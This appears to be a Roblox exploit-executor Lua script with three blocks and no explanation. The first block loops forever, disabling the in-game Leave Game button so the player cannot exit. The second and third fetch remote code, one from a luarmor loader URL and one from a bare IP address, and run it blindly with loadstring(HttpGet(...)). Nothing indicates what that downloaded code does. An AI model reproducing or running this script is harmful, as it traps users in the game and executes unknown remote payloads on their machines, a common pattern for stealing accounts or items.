-- Script 1
task.spawn(function()
    while task.wait() do
        pcall(function()
            for _, v in ipairs(getconnections(
                game:GetService("CoreGui")
                    .RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated
            )) do
                v:Disable()
            end
        end)
    end
end)

-- Script 2
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/b7cca66d493ea7fe18629f1b27a3ecc5.lua"))()
end)

-- Script 3
task.spawn(function()
    loadstring(game:HttpGet("http://31.172.87.116/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
end)
